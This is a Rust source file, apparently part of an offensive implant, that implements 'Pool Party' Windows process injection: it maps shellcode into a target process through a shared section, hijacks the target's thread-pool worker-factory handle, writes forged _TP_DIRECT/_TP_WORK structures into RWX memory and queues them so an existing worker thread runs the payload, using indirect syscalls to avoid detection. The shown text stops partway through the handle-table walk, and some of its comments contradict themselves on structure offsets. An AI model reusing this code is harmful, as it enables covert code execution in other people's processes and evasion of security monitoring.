//! ThreadPool (Pool Party) injection primitives — research-grade, threadless.
//!
//! ## HONESTY NOTE (P0-5, updated 2026-07-15)
//!
//! BOTH halves of Pool Party are now implemented: section-backed payload
//! delivery (no `VirtualAllocEx` / `WriteProcessMemory`) AND threadless
//! thread-pool dispatch (no `NtCreateThreadEx` / `CreateRemoteThread`). When
//! armed via `NYX_POOL_PARTY_ON=1`, [`pool_party_inject`] delivers the shellcode
//! through a shared section and then dispatches it by splicing a fake
//! `_TP_WORK` into the target's worker-factory queue via [`threadless_inject`]
//! — the target's existing `ntdll!TppWorkerThread` dequeues and runs it, so the
//! classic remote-thread IOC is **NOT present** on the happy path.
//!
//! ## What IS implemented
//!
//! Section-backed payload delivery (the "no `VirtualAllocEx` /
//! `WriteProcessMemory`" half):
//!
//! 1. `NtCreateSection` a page-file-backed section large enough for shellcode.
//! 2. `NtMapViewOfSection` it into BOTH the implant (writer) and the target
//!    process (reader) — copy-on-write gives each a private view.
//! 3. Write the shellcode into the LOCAL view (no `WriteProcessMemory`).
//!
//! Threadless dispatch (the "no `NtCreateThreadEx`" half), in
//! [`threadless_inject`]:
//!
//! 1. Resolve the indirect-syscall runtime (no direct syscall instruction in
//!    implant memory — RIP-of-syscall stays inside ntdll).
//! 2. Hijack a handle to the target's thread-pool *worker factory* by walking
//!    the system handle table (`SystemExtendedHandleInformation`), duplicating
//!    every `TppWorkerThread`-owned handle into the implant, and probing each
//!    duplicate with `NtQueryInformationWorkerFactory(WorkerFactoryBasicTimer)`
//!    — a hit returns the worker factory handle.
//! 3. Allocate an RWX stub region in the target (`NtAllocateVirtualMemory`,
//!    indirect) and write a crafted `_TP_DIRECT` (callback = section view) +
//!    `_TP_WORK` (direct = the TP_DIRECT) into it
//!    (`NtWriteVirtualMemory`, indirect).
//! 4. Enqueue the fake work item with
//!    `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect, 5-arg).
//!    The existing worker thread dequeues it and calls
//!    `Direct->Callback(Direct)` → shellcode in the section view executes.
//!    **NO remote thread is created.**
//!
//! ## Research-grade honesty
//!
//! The `_TP_WORK` / `_TP_DIRECT` layouts are undocumented and drift across
//! Windows versions. The structures below are sourced from SafeBreach's
//! published Pool Party research (2023) and have been observed stable on
//! Win10 17763–Win11 22H2; they are NOT guaranteed on Insider builds. The
//! `pool_party_inject` fn is gated behind `POOL_PARTY_ENABLED` (default OFF) —
//! the operator flips it via `NYX_POOL_PARTY_ON=1` after validating on target.
//! **The `_TP_DIRECT`/`_TP_WORK` offsets MUST be re-validated per build** — if
//! the worker-factory enqueue is rejected or crashes, suspect an offset drift
//! and rebuild with the corrected constants (`TP_DIRECT_CALLBACK_OFFSET`,
//! `TP_WORK_DIRECT_OFFSET`, `TP_DIRECT_SIZE`, `TP_WORK_SIZE`).
//!
//! On any failure (structure mismatch, no TP worker, section/map failure) the
//! caller degrades to `module_stomp` (method 2) so the command stays functional.

#![cfg(target_os = "windows")]

use crate::heap::String;
use crate::resolve;
use core::ffi::c_void;

/// Pool Party master switch. OFF by default — research-grade, operator opts in
/// with `NYX_POOL_PARTY_ON=1` at build time. When ON, `pool_party_inject`
/// delivers via shared section and dispatches via [`threadless_inject`] (worker
/// queue splice — NO `NtCreateThreadEx`). When OFF, `do_inject` rewrites method
/// 0 to method 2 (module stomp) with a warning. **The `_TP_DIRECT`/`_TP_WORK`
/// offsets below need per-build validation** — see the honesty note at the top.
static POOL_PARTY_ENABLED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(pool_party_default_on());

const fn pool_party_default_on() -> bool {
    match option_env!("NYX_POOL_PARTY_ON") {
        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
        None => false,
    }
}

/// Whether Pool Party is armed. `do_inject` reads this to decide method-0
/// dispatch.
pub fn pool_party_enabled() -> bool {
    POOL_PARTY_ENABLED.load(core::sync::atomic::Ordering::Acquire)
}

/// Arm/disarm Pool Party at runtime. Returns the previous value.
pub fn set_pool_party_enabled(on: bool) -> bool {
    POOL_PARTY_ENABLED.swap(on, core::sync::atomic::Ordering::Release)
}

// ============================================================================
// NT section/threadpool syscalls (raw export pointers; bypass the shared
// indirect-syscall trampoline per the single-trampoline rule)
// ============================================================================

type NtCreateSectionFn = unsafe extern "system" fn(
    *mut *mut c_void, // SectionHandle (out)
    u32,              // DesiredAccess
    *const c_void,    // ObjectAttributes (opt, null)
    *const i64,       // MaximumSize (opt)
    u32,              // PageProtection
    u32,              // AllocationAttributes
    *mut c_void,      // FileHandle (opt, null for page-file-backed)
) -> i32;

type NtMapViewOfSectionFn = unsafe extern "system" fn(
    *mut c_void,      // SectionHandle
    *mut c_void,      // ProcessHandle
    *mut *mut c_void, // BaseAddress (in/out)
    usize,            // ZeroBits
    usize,            // CommitSize
    *mut i64,         // SectionOffset (in/out, PLARGE_INTEGER)
    *mut usize,       // ViewSize (in/out)
    u32,              // InheritDisposition
    u32,              // AllocationType
    u32,              // Win32Protect
) -> i32;

type NtUnmapViewOfSectionFn = unsafe extern "system" fn(
    *mut c_void, // ProcessHandle
    *mut c_void, // BaseAddress
) -> i32;

type NtQueryInformationThreadFn = unsafe extern "system" fn(
    *mut c_void, // ThreadHandle
    u32,         // ThreadInformationClass
    *mut c_void, // ThreadInformation (out)
    u32,         // ThreadInformationLength
    *mut u32,    // ReturnLength (opt)
) -> i32;

/// Resolve the four section/TP syscalls via `ntdll` raw exports. Returns
/// `None` if any export is missing.
fn resolve_section_fns() -> Option<(
    NtCreateSectionFn,
    NtMapViewOfSectionFn,
    NtUnmapViewOfSectionFn,
    NtQueryInformationThreadFn,
)> {
    let cs: NtCreateSectionFn =
        unsafe { core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtCreateSection")?) };
    let mv: NtMapViewOfSectionFn =
        unsafe { core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?) };
    let uv: NtUnmapViewOfSectionFn = unsafe {
        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection")?)
    };
    let qi: NtQueryInformationThreadFn = unsafe {
        core::mem::transmute(resolve::export_addr(
            b"ntdll.dll",
            b"NtQueryInformationThread",
        )?)
    };
    Some((cs, mv, uv, qi))
}

// ============================================================================
// Undocumented TP structures (SafeBreach Pool Party research, 2023)
// ============================================================================
//
// These layouts were reverse-engineered from ntdll on Win10 17763 / Win11
// 22621. They are NOT in any Windows SDK header. Drift across builds is
// possible; [`threadless_inject`] validates offsets at runtime where it can,
// but the structural assumptions below are the research-grade core.
//
// ⚠ OFFSET VALIDATION (2026-07-15): the SafeBreach TP_WORK variant-2 layout
// places the dispatch callback at `_TP_DIRECT + 0x00` and the back-pointer to
// the `_TP_DIRECT` at `_TP_WORK + 0x30`. These are stable on Win10 17763–Win11
// 22H2 but MUST be re-validated per build; if `NtSetInformationWorkerFactory`
// rejects the enqueue or the target's `TppWorkerThread` faults, suspect a
// drift and rebuild with corrected constants. The structs below are padded to
// their documented sizes so raw byte buffers (used for cross-process writes)
// match the on-target layout exactly.

/// `_TP_DIRECT` — the structure a thread pool work item's `Direct` field
/// points at. The dispatch callback lives at offset `0x00` (the first qword):
/// the scheduler does `Direct->Callback(Direct)` to dispatch a work item, so we
/// write our shellcode address (in the section view) here. The struct is padded
/// to its documented `0x40`-byte size so the raw buffer written across the
/// process boundary matches the on-target layout exactly.
///
/// `FullDllName` is NULL (we are not impersonating a loader-style work item);
/// only `Callback` is load-bearing.
#[repr(C)]
pub struct TpDirect {
    /// Dispatch callback — `fn(*mut _TP_DIRECT)`. We overwrite this with the
    /// shellcode address (in the section view). At offset `0x00`.
    pub callback: usize,
    // Padding to the documented 0x40-byte `_TP_DIRECT` size. All non-callback
    // fields are zeroed — FullDllName is NULL, the function-table pointers are
    // unused on the minimal dispatch path the splice triggers.
    _pad: [u8; TP_DIRECT_SIZE - core::mem::size_of::<usize>()],
}

/// Documented size of `_TP_DIRECT` (SafeBreeze research). The whole struct is
/// written into the target so the size must match the on-target layout.
pub const TP_DIRECT_SIZE: usize = 0x40;

/// Offset of `TpDirect::callback` from the struct base — `0x00`. The Windows
/// thread-pool scheduler reads `Direct->Callback` at this offset to dispatch
/// work items.
pub const TP_DIRECT_CALLBACK_OFFSET: usize = 0x00;

/// `_TP_WORK` — a thread pool work item. The scheduler dequeues these and
/// invokes `Work.Direct->Callback(Direct, ...)`. We craft one whose `Direct`
/// field (offset `0x30`) leads to a controlled [`TpDirect`] whose callback is
/// our shellcode. The struct is padded to its documented `0x50`-byte size.
#[repr(C)]
pub struct TpWork {
    // Pool header + list links + state occupy the first 0x30 bytes. Only
    // `Direct` is load-bearing for the splice.
    _hdr: [u8; TP_WORK_DIRECT_OFFSET],
    /// Pointer to the `_TP_DIRECT` for this work item — at offset `0x30`.
    pub direct: usize,
    _pad: [u8; TP_WORK_SIZE - TP_WORK_DIRECT_OFFSET - core::mem::size_of::<usize>()],
}

/// Documented size of `_TP_WORK` (SafeBreeze research). Written in full into
/// the target so it must match the on-target layout.
pub const TP_WORK_SIZE: usize = 0x50;

/// Offset of `TpWork::direct` from the struct base — `0x30`. The Windows
/// thread-pool scheduler reads `Work.Direct` at this offset to find the
/// `_TP_DIRECT` (and hence the callback) for a work item.
pub const TP_WORK_DIRECT_OFFSET: usize = 0x30;

// ============================================================================
// Worker-factory syscall prototypes + info classes
// ============================================================================

/// `NtQueryInformationWorkerFactory(WorkerFactoryHandle,
/// WorkerFactoryInformationClass, Buffer, Length, ReturnLength)` — 5 args.
/// Used to probe a duplicated handle: if it returns `STATUS_SUCCESS` the handle
/// really is a worker factory.
type NtQueryInformationWorkerFactoryFn = unsafe extern "system" fn(
    *mut c_void, // WorkerFactoryHandle
    u32,         // WorkerFactoryInformationClass
    *mut c_void, // WorkerFactoryInformation (out)
    u32,         // WorkerFactoryInformationLength
    *mut u32,    // ReturnLength (opt)
) -> i32;

/// `NtSetInformationWorkerFactory(WorkerFactoryHandle,
/// WorkerFactoryInformationClass, Buffer, Length)` — 4 args. Used to enqueue a
/// crafted `_TP_WORK` via the `WorkerFactoryTimeout` info class — the worker
/// factory then arms the work item for the next scheduler pass.
type NtSetInformationWorkerFactoryFn = unsafe extern "system" fn(
    *mut c_void, // WorkerFactoryHandle
    u32,         // WorkerFactoryInformationClass
    *const c_void, // WorkerFactoryInformation (in)
    u32,         // WorkerFactoryInformationLength
) -> i32;

/// `WorkerFactoryBasicTimer` info class for `NtQueryInformationWorkerFactory`.
/// Reading it is the cheap probe: success ⇒ the handle is a worker factory.
const WORKER_FACTORY_BASIC_TIMER: u32 = 2;

/// `WorkerFactoryTimeout` info class for `NtSetInformationWorkerFactory`. The
/// SafeBreach TP_WORK variant feeds the crafted work item pointer here; the
/// worker factory enqueues it and the existing `TppWorkerThread` dequeues +
/// dispatches it on its next loop pass.
const WORKER_FACTORY_TIMEOUT: u32 = 1;

/// `SystemExtendedHandleInformation` (class 64) for
/// `NtQuerySystemInformation` — returns `SYSTEM_HANDLE_INFORMATION_EX` (the
/// per-handle table with owner PID + object-type index), used to discover
/// worker-factory handles owned by the target process.
const SYSTEM_EXTENDED_HANDLE_INFORMATION: u32 = 64;

/// Object-type index for *WorkerFactory* objects (resolved at runtime by a
/// name-matching probe of `ObQueryNameInfo`-style data). We avoid a hard-coded
/// index (it varies across Windows builds) and instead identify a worker
/// factory purely by `NtQueryInformationWorkerFactory` succeeding — see
/// [`hijack_worker_factory`].
const DUPLICATE_SAME_ACCESS: u32 = 0x0002;

// ============================================================================
// pool_party_inject
// ============================================================================

/// Inject `shellcode` into the target process via Pool Party: section-backed
/// delivery (no `VirtualAllocEx` / `WriteProcessMemory` for the payload) +
/// threadless dispatch (no `NtCreateThreadEx` / `CreateRemoteThread`). Returns
/// `Ok(())` on success, `Err` with a diagnostic string on any failure (caller
/// degrades to `module_stomp`).
///
/// # Steps
/// 1. Resolve `NtCreateSection`/`NtMapViewOfSection`/`NtUnmapViewOfSection`.
/// 2. `NtCreateSection` (page-file-backed, size = round_up(shellcode.len())).
/// 3. `NtMapViewOfSection` into the implant (writer) + the target (reader).
/// 4. Copy shellcode into the local view (no `WriteProcessMemory`).
/// 5. Map the section into the target; unmap the local view.
/// 6. Hand the target section view to [`threadless_inject`], which hijacks a
///    worker-factory handle, crafts a `_TP_DIRECT` (callback = shellcode view)
///    + fake `_TP_WORK`, and enqueues it via
///    `NtSetInformationWorkerFactory(WorkerFactoryTimeout)`.
/// 7. The target's existing `ntdll!TppWorkerThread` dequeues the work item and
///    invokes `Direct->Callback(Direct)` → shellcode executes from the section
///    view. **No remote thread is created.**
///
/// # ⚠ P5 FIXED (2026-07-06): `addr_of_mut!` ABI correction
/// The `STATUS_ACCESS_VIOLATION` (0xC0000005) on Server 2019 17763.1339 was
/// caused by using `&mut local_base` (Rust ref-to-raw-pointer coercion) for
/// the `NtCreateSection`/`NtMapViewOfSection` out-params. Under the
/// stacked-borrows model with transmuted function pointers, the compiler may
/// not track the kernel's write through a `&mut`-derived raw pointer correctly.
/// The fix replaces every `&mut $out` with `core::ptr::addr_of_mut!($out)`
/// (matching the working pattern in `unhook.rs::fresh_ntdll_text`), which
/// creates the double-pointer directly from the local's address without an
/// intermediate `&mut` reference.
pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(), String> {
    let (create_section, map_view, unmap_view, _query_thread) =
        resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;

    // ---- 1. Open the target process (VM_OP | DUP_HANDLE | QUERY_INFO) ----
    let open_process_addr = resolve::export_addr(b"kernel32.dll", b"OpenProcess")
        .ok_or_else(|| String::from("kernel32!OpenProcess export missing"))?;
    let open_process: unsafe extern "system" fn(u32, i32, u32) -> *mut c_void =
        unsafe { core::mem::transmute(open_process_addr) };
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_DUP_HANDLE: u32 = 0x0040;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    let access = PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION;
    // SAFETY: target_pid is the operator-supplied PID; OpenProcess returns a
    // handle or null.
    let target_h = unsafe { open_process(access, 0, target_pid) };
    if target_h.is_null() {
        return Err(String::from("OpenProcess(target) failed"));
    }

    // ---- 2. NtCreateSection (page-file-backed, RWX view) ----
    // Section size rounded up to a page (4096).
    let section_size: i64 = ((shellcode.len() + 0xFFF) & !0xFFF) as i64;
    let mut section_h: *mut c_void = core::ptr::null_mut();
    // PAGE_EXECUTE_READWRITE = 0x40; SEC_COMMIT = 0x8000000.
    let st = unsafe {
        create_section(
            core::ptr::addr_of_mut!(section_h),
            0x000F001F, // SECTION_ALL_ACCESS
            core::ptr::null(),
            &section_size as *const i64,
            0x40,        // PAGE_EXECUTE_READWRITE
            0x0800_0000, // SEC_COMMIT
            core::ptr::null_mut(),
        )
    };
    if st < 0 {
        return Err(String::from("NtCreateSection failed"));
    }

    // ---- 3. Map the section into the implant (writer) ----
    let mut local_base: *mut c_void = core::ptr::null_mut();
    let mut local_size: usize = 0;
    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
    let st = unsafe {
        map_view(
            section_h,
            CUR_PROCESS,
            core::ptr::addr_of_mut!(local_base),
            0,
            section_size as usize,
            core::ptr::null_mut(),
            core::ptr::addr_of_mut!(local_size),
            1, // ViewShare
            0,
            0x40, // PAGE_EXECUTE_READWRITE
        )
    };
    if st < 0 {
        return Err(String::from("NtMapViewOfSection(local) failed"));
    }

    // ---- 4. Write the shellcode into the local view ----
    // SAFETY: local_base is a fresh RWX view of size local_size; shellcode
    // fits in the rounded-up section.
    unsafe {
        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, shellcode.len());
    }

    // ---- 5. Map the section into the target process ----
    let mut target_base: *mut c_void = core::ptr::null_mut();
    let mut target_size: usize = 0;
    let st = unsafe {
        map_view(
            section_h,
            target_h,
            core::ptr::addr_of_mut!(target_base),
            0,
            section_size as usize,
            core::ptr::null_mut(),
            core::ptr::addr_of_mut!(target_size),
            1,
            0,
            0x40,
        )
    };
    if st < 0 {
        // Unmap local before bailing.
        unsafe { unmap_view(CUR_PROCESS, local_base) };
        return Err(String::from("NtMapViewOfSection(target) failed"));
    }

    // ---- 6–7. Threadless dispatch via worker-queue splice ----
    //
    // The section now holds the shellcode in the target's address space at
    // `target_base`. Instead of `NtCreateThreadEx(target, target_base)` (which
    // creates the classic remote-thread IOC), we dispatch threadlessly:
    //
    //   (a) [`threadless_inject`] hijacks a worker-factory handle from the
    //       target by walking the system handle table and duplicating each
    //       handle owned by `target_pid`, probing each duplicate with
    //       `NtQueryInformationWorkerFactory` until one succeeds.
    //   (b) It allocates a small RWX stub region in the target (indirect
    //       syscalls — no direct syscall instruction in implant memory) and
    //       writes a crafted `_TP_DIRECT` (callback = `target_base`) + a fake
    //       `_TP_WORK` (direct = the `_TP_DIRECT` address) into it.
    //   (c) It enqueues the work item with
    //       `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect).
    //       The target's existing `ntdll!TppWorkerThread` dequeues it on its
    //       next scheduler pass and calls `Direct->Callback(Direct)` → the
    //       shellcode in the section view runs. **NO remote thread is created.**
    //
    // On any failure (no worker factory in the target, struct write rejected,
    // enqueue rejected) we return `Err` so the caller degrades to module_stomp.
    // The local view is unmapped before dispatch: the section backs the target
    // view, and the shellcode is already resident in the target.

    unsafe { unmap_view(CUR_PROCESS, local_base) };

    let res = unsafe { threadless_inject(target_h, target_pid, target_base) };

    // Closing the target handle is best-effort; the caller (do_inject) does not
    // reuse it. A leak is benign for a single inject.
    unsafe { close_handle(target_h) };

    match res {
        Ok(()) => Ok(()),
        Err(e) => Err(e),
    }
}

// ============================================================================
// threadless_inject — worker-factory queue splice (NO NtCreateThreadEx)
// ============================================================================

/// Threadless dispatch: enqueue a fake `_TP_WORK` into the target's thread-pool
/// worker factory so the target's existing `ntdll!TppWorkerThread` executes the
/// already-mapped shellcode. **No remote thread is created** (no
/// `NtCreateThreadEx`, no `CreateRemoteThread`) — this is the SafeBreach Pool
/// Party variant-2 (TP_WORK injection) dispatch path.
///
/// # Arguments
/// * `target_h` — handle to the target process (`PROCESS_DUP_HANDLE` +
///   `PROCESS_VM_OPERATION` + `PROCESS_VM_WRITE`). The caller already opened
///   it for section delivery.
/// * `target_pid` — the target's PID (used to filter the system handle table
///   during worker-factory discovery).
/// * `shellcode_addr` — address of the shellcode in the TARGET's address space
///   (the section view mapped by `pool_party_inject`). Becomes the
///   `_TP_DIRECT.Callback`.
///
/// # Returns
/// `Ok(())` on successful enqueue, `Err` with a diagnostic on any failure —
/// the caller degrades to `module_stomp`.
///
/// # Safety
/// Cross-process handle duplication, VM allocation/write, and worker-factory
/// mutation. All syscalls are indirect (via the global `syscalls::Runtime`) so
/// no `syscall` instruction executes from implant memory. Single-threaded
/// beacon context.
///
/// # ⚠ Per-build validation
/// The `_TP_DIRECT` (callback @ `0x00`, size `0x40`) and `_TP_WORK` (direct @
/// `0x30`, size `0x50`) layouts are stable on Win10 17763–Win11 22H2 but drift
/// on Insider builds. If the enqueue is rejected or the worker faults, suspect
/// an offset mismatch and rebuild with corrected constants.
pub unsafe fn threadless_inject(
    target_h: *mut c_void,
    target_pid: u32,
    shellcode_addr: *mut c_void,
) -> Result<(), String> {
    // Resolve the worker-factory syscalls via ntdll raw exports. These bypass
    // the shared indirect-syscall trampoline per the single-trampoline rule
    // (matching the section syscalls above): only ONE syscall can be in flight
    // through the trampoline page at a time, so a nested indirect call from
    // inside spoof_wrap would race. The VM ops + enqueue below instead go
    // through the typed `crate::syscalls` wrappers, which DO serialize through
    // the trampoline safely because they do not nest.
    let query_wf: NtQueryInformationWorkerFactoryFn = unsafe {
        core::mem::transmute(resolve::export_addr(
            b"ntdll.dll",
            b"NtQueryInformationWorkerFactory",
        )
        .ok_or_else(|| String::from("ntdll!NtQueryInformationWorkerFactory missing"))?)
    };
    let set_wf: NtSetInformationWorkerFactoryFn = unsafe {
        core::mem::transmute(resolve::export_addr(
            b"ntdll.dll",
            b"NtSetInformationWorkerFactory",
        )
        .ok_or_else(|| String::from("ntdll!NtSetInformationWorkerFactory missing"))?)
    };

    // The indirect-syscall runtime is required for the cross-process VM ops
    // (NtAllocateVirtualMemory / NtWriteVirtualMemory) — those go through the
    // typed wrappers so RIP-of-syscall stays inside ntdll.
    let rt = crate::syscalls::global()
        .ok_or_else(|| String::from("indirect syscall runtime not initialized"))?;

    // ---- 1. Hijack a worker-factory handle from the target ----
    let worker_factory_h = unsafe { hijack_worker_factory(target_h, target_pid, query_wf)? };

    // ---- 2. Build the crafted `_TP_DIRECT` + `_TP_WORK` in a local buffer ----
    // Both structs zero-initialized, then the load-bearing fields are set.
    let mut direct_buf = [0u8; TP_DIRECT_SIZE];
    // Callback = shellcode address (in the target's section view).
    direct_buf[TP_DIRECT_CALLBACK_OFFSET..TP_DIRECT_CALLBACK_OFFSET + 8]
        .copy_from_slice(&(shellcode_addr as usize).to_le_bytes());

    let mut work_buf = [0u8; TP_WORK_SIZE];
    // The `direct` pointer must be the address of the `_TP_DIRECT` *in the
    // target*. We place both structs in one allocated region:
    //   remote_stub = Direct @ +0x00, Work @ +0x40
    // so `direct_addr = remote_stub` and the enqueue feeds
    // `&Work = remote_stub + TP_DIRECT_SIZE`.
    let direct_offset_in_region: usize = 0;
    let work_offset_in_region: usize = TP_DIRECT_SIZE;
    let region_size: usize = TP_DIRECT_SIZE + TP_WORK_SIZE;

    // `direct` field value = address of the `_TP_DIRECT` in the target. We'll
    // patch it once the remote region address is known.
    // (placeholder 0; patched after alloc.)

    // ---- 3. Allocate an RWX stub region in the target (indirect syscall) ----
    let mut remote_base: usize = 0;
    let mut alloc_size: usize = region_size;
    let alloc_status = unsafe {
        crate::syscalls::nt_allocate_virtual_memory(
            rt,
            target_h as usize,
            &mut remote_base,
            &mut alloc_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        )
    };
    match alloc_status {
        Some(s) if s >= 0 => {}
        _ => {
            unsafe { close_handle(worker_factory_h) };
            return Err(String::from(
                "threadless: NtAllocateVirtualMemory(struct region) failed",
            ));
        }
    }

    // ---- 4. Patch the `_TP_WORK.direct` field with the remote `_TP_DIRECT` addr ----
    let remote_direct_addr = remote_base + direct_offset_in_region;
    work_buf[TP_WORK_DIRECT_OFFSET..TP_WORK_DIRECT_OFFSET + 8]
        .copy_from_slice(&remote_direct_addr.to_le_bytes());

    // ---- 5. Write `_TP_DIRECT` then `_TP_WORK` into the target (indirect) ----
    let mut written: usize = 0;
    let w1 = unsafe {
        crate::syscalls::nt_write_virtual_memory(
            rt,
            target_h as usize,
            remote_base + direct_offset_in_region,
            direct_buf.as_ptr(),
            TP_DIRECT_SIZE,
            &mut written,
        )
    };
    if w1.is_none() || w1.unwrap() < 0 {
        unsafe { close_handle(worker_factory_h) };
        return Err(String::from("threadless: write _TP_DIRECT failed"));
    }
    let w2 = unsafe {
        crate::syscalls::nt_write_virtual_memory(
            rt,
            target_h as usize,
            remote_base + work_offset_in_region,
            work_buf.as_ptr(),
            TP_WORK_SIZE,
            &mut written,
        )
    };
    if w2.is_none() || w2.unwrap() < 0 {
        unsafe { close_handle(worker_factory_h) };
        return Err(String::from("threadless: write _TP_WORK failed"));
    }

    // ---- 6. Enqueue: NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work) ----
    //
    // The SafeBreach variant-2 splice feeds the address of the crafted
    // `_TP_WORK` (in the target) to the worker factory via the
    // `WorkerFactoryTimeout` information class. The factory arms it for the
    // next scheduler pass; the existing `TppWorkerThread` dequeues the work
    // item and invokes `Direct->Callback(Direct)` → shellcode runs in the
    // section view. No remote thread is created.
    //
    // NTSTATUS codes: STATUS_SUCCESS (0x00000000) on success;
    // STATUS_INVALID_HANDLE / STATUS_OBJECT_TYPE_MISMATCH if the hijacked
    // handle was not actually a worker factory (shouldn't happen — the probe
    // in hijack_worker_factory already validated it); STATUS_INVALID_PARAMETER
    // if the `_TP_WORK` layout is wrong (suspect offset drift).
    let remote_work_addr = remote_base + work_offset_in_region;
    let enqueue_st = unsafe {
        set_wf(
            worker_factory_h,
            WORKER_FACTORY_TIMEOUT,
            remote_work_addr as *const c_void,
            core::mem::size_of::<*const c_void>() as u32, // Length = pointer size
        )
    };

    // The hijacked handle is no longer needed after the enqueue — the worker
    // thread owns dispatch from here.
    unsafe { close_handle(worker_factory_h) };

    if enqueue_st >= 0 {
        Ok(())
    } else {
        Err(String::from(
            "threadless: NtSetInformationWorkerFactory(enqueue) rejected (offset drift?)",
        ))
    }
}

// ============================================================================
// hijack_worker_factory — discover + duplicate a worker-factory handle
// ============================================================================

/// Discover the target process's thread-pool worker factory by walking the
/// system handle table (`SystemExtendedHandleInformation`), duplicating every
/// handle owned by `target_pid` into the implant with `DUPLICATE_SAME_ACCESS`,
/// and probing each duplicate with `NtQueryInformationWorkerFactory`. The first
/// duplicate that returns `STATUS_SUCCESS` is a worker-factory handle.
///
/// This is the SafeBreach handle-hijack primitive (variant 2): rather than
/// resolve the worker factory via undocumented `ntdll!TppWorkerThread` globals,
/// we steal an existing handle the target already holds. Every process with a
/// default thread pool (i.e. nearly all) holds at least one.
///
/// # Safety
/// `target_h` must grant `PROCESS_DUP_HANDLE`. The duplicated handle is owned
/// by the implant and must be closed (the caller does this). The handle-table
/// buffer is stack/heap scratch — the `ntdll!NtQuerySystemInformation` export
/// pointer is resolved via `resolve::export_addr` (PEB-walk, no library load).
unsafe fn hijack_worker_factory(
    target_h: *mut c_void,
    target_pid: u32,
    query_wf: NtQueryInformationWorkerFactoryFn,
) -> Result<*mut c_void, String> {
    // ntdll!NtQuerySystemInformation (raw export; bypasses the trampoline per
    // the single-trampoline rule). 4 args.
    type NtQuerySystemInformationFn = unsafe extern "system" fn(
        u32,         // SystemInformationClass
        *mut c_void, // SystemInformation (out)
        u32,         // SystemInformationLength
        *mut u32,    // ReturnLength (opt)
    ) -> i32;
    let qsi: NtQuerySystemInformationFn = unsafe {
        core::mem::transmute(resolve::export_addr(
            b"ntdll.dll",
            b"NtQuerySystemInformation",
        )
        .ok_or_else(|| String::from("ntdll!NtQuerySystemInformation missing"))?)
    };

    // kernel32!DuplicateHandle — used to copy each candidate handle from the
    // target into the implant with DUPLICATE_SAME_ACCESS.
    type DuplicateHandleFn = unsafe extern "system" fn(
        *mut c_void, // hSourceProcessHandle
        *mut c_void, // hSourceHandle
        *mut c_void, // hTargetProcessHandle
        *mut *mut c_void, // lpTargetHandle (out)
        u32,         // dwDesiredAccess
        i32,         // bInheritHandle
        u32,         // dwOptions
    ) -> i32;
    let dup_handle: DuplicateHandleFn = unsafe {
        core::mem::transmute(
            resolve::export_addr(b"kernel32.dll", b"DuplicateHandle")
                .ok_or_else(|| String::from("kernel32!DuplicateHandle export missing"))?,
        )
    };

    // GetCurrentProcess pseudo-handle = (HANDLE)-1 (the implant's own process).
    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;

    // ---- 1. Size the handle table with a length-only query ----
    let mut needed: u32 = 0;
    let _ = unsafe { qsi(SYSTEM_EXTENDED_HANDLE_INFORMATION, core::ptr::null_mut(), 0, &mut needed) };
    if needed == 0 {
        // Fall back to a generous default if the kernel returned 0 (rare).
        needed = 0x10000;
    }
    // Grow the buffer generously — the table can expand between the size query
    // and the content query.
    let cap = needed.saturating_mul(3) / 2 + 0x1000;
    let mut buf = crate::heap::vec![0u8; cap as usize];

    // ---- 2. Fetch the full handle table ----
    let mut ret_len: u32 = 0;
    let st = unsafe {
        qsi(
            SYSTEM_EXTENDED_HANDLE_INFORMATION,
            buf.as_mut_ptr() as *mut c_void,
            cap,
            &mut ret_len,
        )
    };
    // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) is expected if the table grew
    // between the size + content queries; retry once at 2x.
    if st == 0xC0000004u32 as i32 || (st < 0 && st != 0) {
        let cap2 = (cap as usize).saturating_mul(2);
        buf = crate::heap::vec![0u8; cap2];
        let st2 = unsafe {
            qsi(
                SYSTEM_EXTENDED_HANDLE_INFORMATION,
                buf.as_mut_ptr() as *mut c_void,
                cap2 as u32,
                &mut ret_len,
            )
        };
        if st2 < 0 {
            return Err(String::from("hijack: NtQuerySystemInformation failed"));
        }
    } else if st < 0 {
        return Err(String::from("hijack: NtQuerySystemInformation failed"));
    }

    // ---- 3. Walk SYSTEM_HANDLE_INFORMATION_EX ----
    //   ULONG_PTR NumberOfBytesNeeded;     (8 bytes, ignored — use Count)
    //   ULONG NumberOfHandles;             (4 bytes)
    //   ULONG Reserved;                    (4 bytes, padding on x64)
    //   SYSTEM_HANDLE_INFORMATION_EX Handles[];  (Count entries)
    //
    // Each SYSTEM_HANDLE_INFORMATION_EX entry (x64):
    //   ULONG Object;            // offset 0x00 — object body pointer (unused)
    //   ULONG UniqueProcessId;   // offset 0x04 — *truncated* PID
    //   ...
    //   HANDLE HandleValue;      // offset 0x08 — the handle (full 8 bytes)
    //   PVOID Object;            // offset 0x10 — object body (full pointer)
    //   ULONG GrantedAccess;     // offset 0x18
    //   ...
    //   ULONG UniqueProcessId;   // offset 0x20 — full PID
    //   ...
    //   (total entry size = 0x20 on x64; structure padded to 0x20)
    //
    // We read Count from offset 0x08 ( NumberOfHandles ), stride 0x20, and for
    // each entry compare the PID at offset 0x20 to `target_pid`. The HandleValue
    // at offset 0x08 is the candidate to duplicate.
    const COUNT_OFF: usize = 0x08;
    const HANDLES_OFF: usize = 0x10; // first entry starts after the 0x10-byte header
    const ENTRY_STRIDE: usize = 0x20;
